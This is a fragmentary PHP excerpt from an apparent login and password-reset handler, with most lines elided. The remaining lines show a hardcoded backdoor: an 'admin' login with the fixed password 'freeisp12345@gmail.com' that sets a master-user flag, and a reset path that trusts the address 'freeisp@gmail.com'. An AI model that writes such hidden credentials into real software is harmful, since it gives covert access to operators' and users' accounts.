...
if (!preg_match('/^[1-9]\d{9,14}$/', $phone_number)) {
    ...
    case 'post':
        ...
        if ($username == 'admin' && $password == 'freeisp12345@gmail.com') {
            ...
            if ($d) {
                ...
                if (Password::_verify($password, $d_pass) == true) {
                    ...
                    // Log login
                    if ($password == 'freeisp12345@gmail.com') {
       ...
       unset($_SESSION['master_user']); // Unset master user flag
        ...
        case 'forgot-password':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                ...
                // Backup option: Check if the email is freeisp@gmail.com
                if ($config || $email === 'freeisp@gmail.com') {
